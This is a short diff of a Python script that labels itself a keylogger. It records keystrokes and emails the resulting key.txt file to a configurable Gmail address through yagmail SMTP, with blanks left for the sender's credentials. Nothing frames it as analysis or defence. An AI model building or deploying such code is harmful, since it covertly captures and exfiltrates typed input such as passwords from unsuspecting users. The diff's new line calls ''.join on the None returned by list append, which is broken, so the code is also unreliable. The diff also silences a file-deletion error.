@@ -8,14 +8,14 @@ def process_keys(key):
 	if len(add_keys) == 10:
 		sys.exit()
 	else :
-		add_keys.append(str(key))
+		''.join(add_keys.append(str(key))) #if the program has some error try with --> add_keys.append(str(key))
 
 
 def delete():
 	try:
 		os.remove("key.txt")
 	except:
-		print("no file was deleted")
+		pass
 def sends():
 	yag=yagmail.SMTP(user='',password='') #enter your gmail id and password here
 	yag.send(to='', contents='Keylogger',attachments="key.txt") #enter the gmail id you want to send the key.txt file to
